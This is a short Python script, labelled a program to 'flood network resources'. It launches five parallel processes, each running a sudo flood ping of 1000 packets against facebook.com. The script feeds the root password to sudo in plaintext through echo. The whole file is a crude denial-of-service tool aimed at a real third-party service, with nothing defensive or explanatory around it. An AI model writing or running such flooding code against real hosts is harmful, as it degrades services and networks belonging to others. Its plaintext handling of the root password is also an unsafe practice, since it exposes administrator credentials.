#Program to flood network resources
#Replace Password with root password

import os
import time
import multiprocessing

print("Running packet flooder")

def pinger():
	os.system("echo Password | sudo -S ping -f facebook.com -c 1000")

parent_process=multiprocessing.Process(target=pinger)
parent_process.start()

for x in range(4):
	temp_thread=multiprocessing.Process(target=pinger)
	temp_thread.start()	
	time.sleep(1)